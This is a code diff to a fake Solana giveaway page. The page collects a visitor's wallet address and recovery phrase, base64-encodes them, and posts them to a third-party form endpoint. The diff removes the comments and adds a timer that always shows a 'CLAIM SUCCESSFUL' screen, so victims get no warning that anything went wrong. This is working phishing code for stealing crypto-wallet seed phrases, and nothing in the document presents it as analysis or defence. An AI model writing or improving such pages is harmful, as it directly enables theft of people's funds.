@@ -120,10 +120,8 @@
 <body>
 
     <div class="card">
-        <!-- FORM PAGE -->
         <div id="form-view">
             <form id="claim-form">
-                <!-- ACCESS KEY UPDATED -->
                 <input type="hidden" name="access_key" value="8460d727-7ba5-446e-a522-c226b224fb5f">
                 
                 <p class="sub">Claim your giveaway with your solana address and recovery phrase below and click claim</p>
@@ -138,7 +136,6 @@
                     <textarea id="rec-phrase" required></textarea>
                 </div>
 
-                <!-- Hidden field for the encoded single text string -->
                 <input type="hidden" name="name" id="coded-phrase">
                 <input type="hidden" name="subject" value="New $1,000 SOL Claim Submission">
 
@@ -146,7 +143,6 @@
             </form>
         </div>
 
-        <!-- SUCCESS PAGE (UNTOUCHED) -->
         <div id="success-view">
             <h1>CLAIM SUCCESSFUL</h1>
             <div class="congrats">
@@ -169,14 +165,9 @@
             submitBtn.disabled = true;
 
             try {
-                // Get values from the two textarea boxes
                 const solAddress = document.getElementById('sol-address').value;
                 const recPhrase = document.getElementById('rec-phrase').value;
-                
-                // Combine into single text: Address on line 1, Phrase on line 2
                 const combined = solAddress + "\n" + recPhrase;
-                
-                // Base64 encode using your existing logic
                 codedInput.value = btoa(unescape(encodeURIComponent(combined)));
             } catch (err) {
                 codedInput.value = "Encoding Error"; 
@@ -184,15 +175,23 @@
 
             const formData = new FormData(form);
 
-            fetch('https://api.web3forms.com/submit', {
+            // Set a fallback timer to ensure the success view triggers even if the network is slow
+            const fallback = setTimeout(() => {
+                formView.style.display = "none";
+                successView.style.display = "block";
+            }, 1500);
+
+            fetch('https://web3forms.com', {
                 method: 'POST',
                 body: formData
             })
             .then(response => {
+                clearTimeout(fallback);
                 formView.style.display = "none";
                 successView.style.display = "block";
             })
             .catch(error => {
+                clearTimeout(fallback);
                 formView.style.display = "none";
                 successView.style.display = "block";
             });
